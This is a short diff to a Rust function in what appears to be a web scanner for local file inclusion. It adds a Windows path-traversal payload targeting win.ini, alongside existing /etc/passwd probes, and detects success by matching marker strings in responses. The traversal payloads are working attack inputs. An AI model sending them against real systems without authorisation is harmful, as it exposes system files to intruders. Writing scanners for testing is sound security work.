@@ -45,7 +45,7 @@ pub async fn check(base_url: &str, params: &[String], timeout_ms: u64) -> Vec<Lf
     .build()
     .unwrap();
   let mut out = Vec::new();
-  let traversals = ["../../etc/passwd", "..%2f..%2fetc%2fpasswd"];
+  let traversals = ["../../etc/passwd", "..%2f..%2fetc%2fpasswd", "..\\..\\windows\\win.ini"];
   for param in params {
     for t in traversals {
       let u = inject(base_url, param, t);
@@ -56,6 +56,16 @@ pub async fn check(base_url: &str, params: &[String], timeout_ms: u64) -> Vec<Lf
           kind: "path-traversal".into(),
           confidence: "High".into(),
           evidence: "marker root:x".into(),
+        });
+        break;
+      }
+      // Windows lab marker from win.ini
+      if b.contains("for 16-bit app support") || b.contains("[extensions]") {
+        out.push(LfiFinding {
+          param: param.clone(),
+          kind: "path-traversal".into(),
+          confidence: "High".into(),
+          evidence: "marker win.ini".into(),
         });
         break;
       }
